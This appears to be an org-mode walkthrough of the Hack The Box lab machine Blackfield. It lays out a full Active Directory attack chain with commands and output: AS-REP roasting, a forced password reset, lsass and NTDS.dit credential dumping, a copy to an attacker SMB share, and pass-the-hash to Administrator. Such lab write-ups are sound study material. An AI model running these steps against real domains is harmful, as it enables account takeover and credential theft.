@@ -1,0 +1,601 @@
+==
+tags: #windows #hard #backup-users #SeBackupPrivilege #ntds.dit #file-transfer
+=
+
+* nmap
+  #+begin_src bat
+  sudo nmap -sV -sC -oA nmap/blackfield.basic 10.129.229.17
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  spark         Apache Spark
+135/tcp  open  msrpc?
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+  #+end_src
+** full scan
+   #+begin_src bat
+   sudo nmap -p- -A -T4 -oA nmap/blackfield.full 10.129.229.17
+   #+end_src
+* smb
+  #+begin_src bat
+  nxc smb 10.129.229.17 -u '' -p '' --shares
+
+SMB DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB DC01 [+] BLACKFIELD.local\: 
+SMB DC01 [-] Error enumerating shares: STATUS_ACCESS_DENIED
+  #+end_src
+  nonexistent username:
+  #+begin_src bat
+  $ nxc smb 10.129.229.17 -u 'doesnotexit' -p '' --shares
+
+[*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+[+] BLACKFIELD.local\doesnotexit: (Guest)
+[*] Enumerated shares
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+C$                              Default share
+forensic                        Forensic / Audit share.
+IPC$            READ            Remote IPC
+NETLOGON                        Logon server share 
+profiles$       READ            
+SYSVOL                          Logon server share 
+  #+end_src
+* access the share
+  #+begin_src bat
+  $ smbclient -U nonexistent //10.129.229.17/profiles$
+
+  smb: \> dir
+  .                                   D        0  Wed Jun  3 18:47:12 2020
+  ..                                  D        0  Wed Jun  3 18:47:12 2020
+  AAlleni                             D        0  Wed Jun  3 18:47:11 2020
+  ABarteski                           D        0  Wed Jun  3 18:47:11 2020
+  ABekesz                             D        0  Wed Jun  3 18:47:11 2020
+  ABenzies                            D        0  Wed Jun  3 18:47:11 2020
+  <SNIP>
+  #+end_src
+  this lists a bunch of directories which look like usernames;
+  after downloading them and using =tree=, they're all empty. here's how to move
+  them to a subdirectory:
+** move all folders in the current directory to a subdirectory named profile
+  #+begin_src bat
+  find . -maxdepth 1 -type d ! -name profile -exec mv {} profile/ \;
+  #+end_src
+  save these into a =usernames.txt= file so we can attempt asreproasting
+* password policy
+  #+begin_src bat
+  nxc smb 10.129.229.17 -u 'nooone' -p '' --pass-pol
+  #+end_src
+  doesn't return anything.
+* asreproast
+  #+begin_src bat
+  nxc ldap 10.129.229.17 -u usernames.txt -p '' --asreproast asreproast.out
+
+ TimeoutError: [Errno 110] Connection timed out 
+  #+end_src
+  this kept getting timed out, so try =GetNPUsers=
+  #+begin_src bat
+  impacket-GetNPUsers blackfield.local/ -dc-ip 10.129.229.17 -no-pass -usersfile usernames.txt 
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
+  #+end_src
+  =audit2020= seems to be a real user, but every other username apart from
+  =svc_backup= returns *KDC_ERR_C_PRINCIPAL_UNKNOWN*; possibly =svc_backup= is
+  kerberoastable, but we need creds.
+** confirm audit2020 user exists with nxc
+   #+begin_src bat
+   $ nxc smb 10.129.229.17 -u 'audit2020' -p '' --shares
+
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.17   445    DC01             [-] BLACKFIELD.local\audit2020: STATUS_LOGON_FAILURE 
+   #+end_src
+   also fails with password =audit2020=
+** try and brute force the password with kerbrute
+   #+begin_src bat
+   $ kerbrute bruteuser -d blackfield.local --dc 10.129.229.17 /usr/share/wordlists/rockyou.txt audit2020 
+   #+end_src
+   this takes a long time; so cut it off.
+** generate possible passwords with hashcat rules
+   #+begin_src bat
+   echo audit2020 > user.txt
+   hashcat --stdout user.txt -r /usr/share/hashcat/rules/best64.rule > passwords.txt
+   #+end_src
+** nxc password attack
+   #+begin_src bat
+   $ nxc smb 10.129.229.17 -u user.txt -p passwords.txt --shares
+   #+end_src
+   fails
+** rid cycling
+   #+begin_src bat
+   impacket-lookupsid anonymous@blackfield.local -no-pass | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1
+
+Administrator
+Guest
+krbtgt
+DC01$
+audit2020
+support
+svc_backup
+lydericlefebvre
+SRV-WEB$
+SRV-FILE$
+SRV-EXCHANGE$
+SRV-INTRANET$
+   #+end_src
+** attempt to brute-force passwords for each
+   same password as username:
+   #+begin_src bat
+   $ nxc smb 10.129.229.17 -u users.txt -p users.txt --no-bruteforce --continue-on-success
+   #+end_src
+   *STATUS_LOGON_FAILURE* for all
+* ldapsearch
+  #+begin_src bat
+  ldapsearch -x -H ldap://10.129.229.17 -b 'DC=BLACKFIELD,DC=local'   '(objectClass=user)' sAMAccountName description memberOf
+  #+end_src
+* asreproast with new user list
+  #+begin_src bat
+  impacket-GetNPUsers blackfield.local/ -dc-ip 10.129.229.17 -no-pass -usersfile users.txt
+
+[-] Kerberos SessionError: KDC_ERR_NEVER_VALID(Requested starttime is later than end time)
+
+  #+end_src
+  ok this turned out to be fixable; we'd seen this earlier with the original
+  userlist. however, =ntpdate= was not working:
+  #+begin_src
+  $ sudo ntpdate blackfield.local
+
+ntpdig: no eligible servers   
+  #+end_src
+** what to do when ntpdate doesn't work
+   this then meant manually fixing the clock skew;
+*** find target server time
+    #+begin_src 
+    net time -S dc01.blackfield.local
+
+Fri Aug 21 06:47:48 2026  
+     #+end_src
+*** set attack host time to server time
+    #+begin_src 
+    $ sudo date -s '2026-08-21 6:52:00'
+Fri Aug 21 06:52:00 AM CEST 2026
+
+    $ date                                                       
+Fri Aug 21 06:52:23 AM CEST 2026
+    #+end_src
+** asreproast result
+   voila! we get the ticket
+  #+begin_src 
+$krb5asrep$23$support@BLACKFIELD.LOCAL:9e68d5d6049...
+  #+end_src
+** crack the hash
+   #+begin_src bat
+   hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt
+
+#00^BlackKnight
+   #+end_src
+** confirm
+   #+begin_src bat
+   $ nxc smb 10.129.229.17 -u 'support' -p '#00^BlackKnight' --shares
+
+[*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+[+] BLACKFIELD.local\support:#00^BlackKnight
+[*] Enumerated shares
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+C$                              Default share
+forensic                        Forensic / Audit share.
+IPC$            READ            Remote IPC
+NETLOGON        READ            Logon server share
+profiles$       READ
+SYSVOL          READ            Logon server share
+   #+end_src
+   =SYSVOL= doesn't contain anything interesting at first glance; and =NETLOGON= contains nothing at all.
+** get password policy
+   #+begin_src bat
+   $ nxc smb 10.129.229.17 -u 'support' -p '#00^BlackKnight' --pass-pol
+
+[+] BLACKFIELD.local\support:#00^BlackKnight
+[+] Dumping password info for domain: BLACKFIELD
+Minimum password length: 7
+Password history length: 24
+Maximum password age: 41 days 23 hours 53 minutes 
+
+Password Complexity Flags: 000001
+    Domain Refuse Password Change: 0
+    Domain Password Store Cleartext: 0
+    Domain Password Lockout Admins: 0
+    Domain Password No Clear Change: 0
+    Domain Password No Anon Change: 0
+    Domain Password Complex: 1
+
+Minimum password age: 1 day 4 minutes 
+Reset Account Lockout Counter: 30 minutes 
+Locked Account Duration: 30 minutes 
+Account Lockout Threshold: None
+Forced Log off Time: Not Set
+   #+end_src
+* kerberoasting
+  #+begin_src bat
+  impacket-GetUserSPNs -dc-ip 10.129.229.17 BLACKFIELD.local/support -request
+
+No entries found!
+  #+end_src
+* bloodhound                                                         :ATTACH:
+  :PROPERTIES:
+  :ID:       6671251e-74f2-44ca-865c-753ea2964fc6
+  :END:
+  #+begin_src bat
+  rusthound-ce -u support -p '#00^BlackKnight' -d 'BLACKFIELD.local' -c All --zip
+  #+end_src
+  we see that =support= has *ForceChangePassword* on =audit2020=:
+  [[attachment:2026-08-21_00-21.png]]
+* force change password with bloodyAD
+  #+begin_src bat
+  bloodyAD --host DC01.BLACKFIELD.local -d blackfield.local -u support -p '#00^BlackKnight' set password audit2020 'NewStrongP@ssw0rd!'
+
+[+] Password changed successfully!
+  #+end_src
+* access smb as audit2020
+  #+begin_src bat
+  nxc smb 10.129.229.17 -u 'audit2020' -p 'NewStrongP@ssw0rd!' --shares
+
+[*] Enumerated shares
+
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+C$                              Default share
+forensic        READ            Forensic / Audit share.
+IPC$            READ            Remote IPC
+NETLOGON        READ            Logon server share 
+profiles$       READ            
+SYSVOL          READ            Logon server share 
+  #+end_src
+  as expected, we have =READ= access to the =forensic= share
+* forensic share
+  #+begin_src bat
+  smbclient -U audit2020 //10.129.229.17/forensic
+
+  smb: \> dir
+  .                                   D        0  Sun Feb 23 14:03:16 2020
+  ..                                  D        0  Sun Feb 23 14:03:16 2020
+  commands_output                     D        0  Sun Feb 23 19:14:37 2020
+  memory_analysis                     D        0  Thu May 28 22:28:33 2020
+  tools                               D        0  Sun Feb 23 14:39:08 2020
+
+smb: \> cd memory_analysis\
+smb: \memory_analysis\> dir
+  .                                   D        0  Thu May 28 22:28:33 2020
+  ..                                  D        0  Thu May 28 22:28:33 2020
+  conhost.zip                         A 37876530  Thu May 28 22:25:36 2020
+  ctfmon.zip                          A 24962333  Thu May 28 22:25:45 2020
+  dfsrs.zip                           A 23993305  Thu May 28 22:25:54 2020
+  dllhost.zip                         A 18366396  Thu May 28 22:26:04 2020
+  ismserv.zip                         A  8810157  Thu May 28 22:26:13 2020
+  lsass.zip                           A 41936098  Thu May 28 22:25:08 2020
+  mmc.zip                             A 64288607  Thu May 28 22:25:25 2020
+  RuntimeBroker.zip                   A 13332174  Thu May 28 22:26:24 2020
+  ServerManager.zip                   A 131983313  Thu May 28 22:26:49 2020
+  sihost.zip                          A 33141744  Thu May 28 22:27:00 2020
+  smartscreen.zip                     A 33756344  Thu May 28 22:27:11 2020
+  svchost.zip                         A 14408833  Thu May 28 22:27:19 2020
+  taskhostw.zip                       A 34631412  Thu May 28 22:27:30 2020
+  winlogon.zip                        A 14255089  Thu May 28 22:27:38 2020
+  wlms.zip                            A  4067425  Thu May 28 22:27:44 2020
+  WmiPrvSE.zip                        A 18303252  Thu May 28 22:27:53 2020
+
+smb: \memory_analysis\> get lsass.zip
+getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (2385.9 KiloBytes/sec) (average 2385.9 KiloBytes/sec)
+  #+end_src
+  trying to get everything in one go fails; the important one is =lsass.zip=, so
+  let's get that and decrypt it with =pypykatz=
+  #+begin_src bat
+  $ file lsass.DMP                                                    
+
+lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
+
+  $ pypykatz lsa minidump lsass.DMP --json > lsass.json
+
+INFO:pypykatz:Parsing file lsass.DMP
+  #+end_src
+* lsass
+  this seems to contain the NT hashes for all the accounts; even the DC. but
+  thinking it surely can't be that easy, i searched for the =svc_backup= user's
+  hash knowing it's the only one in the =Remote Management= group.
+  to confirm, admin hashes seem to fail
+* user flag
+  #+begin_src bat
+  $ evil-winrm -i blackfield.local -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
+
+  ,*Evil-WinRM* PS C:\Users\svc_backup> type Desktop\user.txt
+
+3920bb317a0bef51027e2852be64b543
+  #+end_src
+* privesc
+  #+begin_src bat
+,*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/26/2020   5:38 PM                PerfLogs
+d-----         6/3/2020   9:47 AM                profiles
+d-r---        3/19/2020  11:08 AM                Program Files
+d-----         2/1/2020  11:05 AM                Program Files (x86)
+d-r---        2/23/2020   9:16 AM                Users
+d-----        9/21/2020   4:29 PM                Windows
+-a----        2/28/2020   4:36 PM            447 notes.txt
+
+
+,*Evil-WinRM* PS C:\> cat notes.txt
+Mates,
+
+After the domain compromise and computer forensic last week, auditors advised us to:
+- change every passwords -- Done.
+- change krbtgt password twice -- Done.
+- disable auditor's account (audit2020) -- KO.
+- use nominative domain admin accounts instead of this one -- KO.
+
+We will probably have to backup & restore things later.
+- Mike.
+
+PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
+,*Evil-WinRM* PS C:\> dir Users
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        11/5/2020   8:40 PM                Administrator
+d-r---         2/1/2020  11:05 AM                Public
+d-----        2/23/2020   9:16 AM                svc_backup
+ #+end_src
+** privileges
+  #+begin_src 
+,*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name             SID
+===================== ==============================================
+blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+  #+end_src
+** probable path
+   #+begin_src 
+   SeBackupPrivilege - bypasses normal file read permissions for backup operations.
+   SeRestorePrivilege - bypasses normal file write permissions when restoring files.
+   #+end_src
+   +this looks like we have to use the =SeBackupPrivilege= and restore/copy some+
+   +file we might not have access to in the absence of said privilege+;
+   NOTE: that's not exactly what that privilege allows.
+   this is suggested by the discovered note also; however, there's no =root.txt=
+   on the =svc_backup= user's desktop; download the relevant dlls from the
+   [[https://github.com/giuliano108/SeBackupPrivilege][SeBackupPrivilege repo]] and try the exploit:
+   #+begin_src bat
+   PS C:\Users\svc_backup\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll                              
+   PS C:\Users\svc_backup\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll                             
+   PS C:\Users\svc_backup\Desktop> Copy-FileSeBackupPrivilege 'C:\users\svc_backup\desktop\root.txt' C:\users\svc_backup\Documents\root.txt
+   Opening input file. - The system cannot find the file specified. (Exception from HRESULT: 0x80070002)   
+   #+end_src
+   try the one on the admin desktop:
+   #+begin_src
+   Copy-FileSeBackupPrivilege 'C:\users\Administrator\desktop\root.txt' C:\users\svc_backup\Documents\root.txt
+
+Opening input file. - Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
+   #+end_src
+** use the privilege to list items on the admin desktop
+   #+begin_src bat
+PS C:\Users\svc_backup\> Get-ChildItem C:\Users\Administrator\Desktop -Force
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a-hs-        9/18/2020   6:31 PM            282 desktop.ini
+-a----        2/28/2020   4:36 PM            447 notes.txt
+-a----        11/5/2020   8:38 PM             32 root.txt
+   #+end_src
+** copy notes
+   #+begin_src bat
+   ,*Evil-WinRM* PS C:\Users\svc_backup> Copy-FileSeBackupPrivilege 'C:\users\Administrator\desktop\notes.txt' .\notes.txt
+
+   ,*Evil-WinRM* PS C:\Users\svc_backup> type notes.txt
+
+Mates,
+
+After the domain compromise and computer forensic last week, auditors advised us to:
+- change every passwords -- Done.
+- change krbtgt password twice -- Done.
+- disable auditor's account (audit2020) -- KO.
+- use nominative domain admin accounts instead of this one -- KO.
+
+We will probably have to backup & restore things later.
+- Mike.
+
+PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
+   #+end_src
+   unsurprisingly, same as the one in =C:\=; however, we have confirmed we can
+   use the privilege to copy and view files we normally wouldn't be able to.
+** try and read SAM database
+   #+begin_src bat
+   Copy-FileSeBackupPrivilege 'c:\Windows\System32\config\SAM' .\sam
+ 
+Opening input file. - The process cannot access the file because it is being used by another process. (Exception from HRESULT: 0x80070020)
+At line:1 char:1
++ Copy-FileSeBackupPrivilege 'c:\Windows\System32\config\SAM' .\sam
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception
+    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege
+   #+end_src
+** check for stored creds
+   #+begin_src bat
+   ,*Evil-WinRM* PS C:\Users\svc_backup\desktop> cmdkey /list
+
+Currently stored credentials:
+
+,* NONE *
+   #+end_src
+** check admin files
+   tried viewing all the files in =C:\Users\Administrator=; didn't find much
+   plus lots of noise from all the material already in the forensic share;
+   tried to narrow it down to =AppData= which did not show up the first time:
+   #+begin_src bat
+   Get-ChildItem C:\Users\Administrator\AppData -Recurse -Force
+
+<SNIP>
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+Mode                LastWriteTime         Length Name                                                                 
+----                -------------         ------ ----                                                                 
+-a----        11/4/2021  12:54 PM            492 ConsoleHost_history.txt
+
+<SNIP>
+   #+end_src
+   copy this:
+   #+begin_src bat
+   Copy-FileSeBackupPrivilege C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt console.txt
+   #+end_src
+   however, it doesn't seem to contain anything interesting.
+** copy lsass.zip
+   let's see if the =lsass= dump contains updated values for admin. =evil-winrm=
+   download was slow, so try =impacket-smbserver=:
+   #+begin_src bat
+   $ impacket-smbserver share . -smb2support 
+   $ copy lsass.zip \\10.10.17.115\share\lsass.zip
+
+An unexpected network error occurred.
+
+At line:1 char:1
++ copy lsass.zip \\10.10.17.115\share\lsass.zip
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+   #+end_src
+   ok, copy it via =evil-winrm=; but it turns out they're the same file.
+** Copy NTDS.dit
+   as shown in [[file:c:/Users/shyam/Documents/code/htb/academy/modules/windows-privilege-escalation/windows-built-in-groups.org::*Attacking a Domain Controller - Copying NTDS.dit][this section]], we can just create a shadow copy of the C drive
+   and copy =NTDS.dit= from it.
+   for this, we need to use the =diskshadow= utility; however, there was an
+   issue using it interactively perhaps some =evil-winrm= weirdness. so, we can
+   use it to read commands from a file. there was some clrf issue on writing
+   and copying the file from linux; so:
+   #+begin_src bat
+   $lines = @(
+    'set verbose ON',
+    'set metadata C:\Windows\Temp\meta.cab',
+    'set context clientaccessible',
+    'set context persistent',
+    'begin backup',
+    'add volume C: alias cdrive',
+    'create',
+    'expose %cdrive% E:',
+    'end backup',
+    'exit'
+)
+
+[System.IO.File]::WriteAllLines(
+    (Resolve-Path .\script.txt),
+    $lines,
+    [System.Text.Encoding]::ASCII
+)
+   #+end_src
+   run it, and it works:
+   #+begin_src bat
+   diskshadow /s .\script.txt
+
+<SNIP>
+Number of shadow copies listed: 1
+-> expose %cdrive% E:
+-> %cdrive% = {c1bcd9cb-c177-4dd1-88ac-ff0d68ade7fe}
+The shadow copy was successfully exposed as E:\.
+-> end backup
+-> exit
+   #+end_src
+   save *SYSTEM* hive:
+   #+begin_src
+   reg save HKLM\SYSTEM SYSTEM.SAV
+   #+end_src
+   faced some issue getting =impacket-smbserver= to work; so download with winrm
+   #+begin_src bat
+   impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+
+<SNIP>   
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: 
+   #+end_src
+** root flag
+   #+begin_src 
+   $ evil-winrm -i blackfield.local -u administrator -H 184fb5e5178480be64824d4cd53b99ee
+
+   ,*Evil-WinRM* PS C:\Users\Administrator> type desktop\root.txt
+4375a629c7c67c8e29db269060c955cb
+   #+end_src
+* ippsec
+** kerbrute to find valid users
+   #+begin_src bat
+   kerbrute userenum --dc <ip> -d blackfield -o kerbrute.users users.list
+   #+end_src
+** use rpcclient to set/change password
+   #+begin_src bat
+   setuserinfo2 support 23 'newPassword!'
+   #+end_src
+** uses wbadmin to backup ntds instead of diskshadow
+   this requires us to create an NTFS volume on kali; skipping.
+** uses secretsdump history flag to find and reset audit2020's password
+** uses psexec and gets shell as system but is unable to read root.txt
+   so uses =wmiexec= instead to get a shell as =administrator=
+** use mimikatz to reset password
+   #+begin_src bat
+   mimikatz.exe "lsadump::setntlm /user:Audit2020 /ntlm:600a406c2c1f2062db9bb227bad654aa"
+   #+end_src
+   the hash was obtained from the secretsdump history run
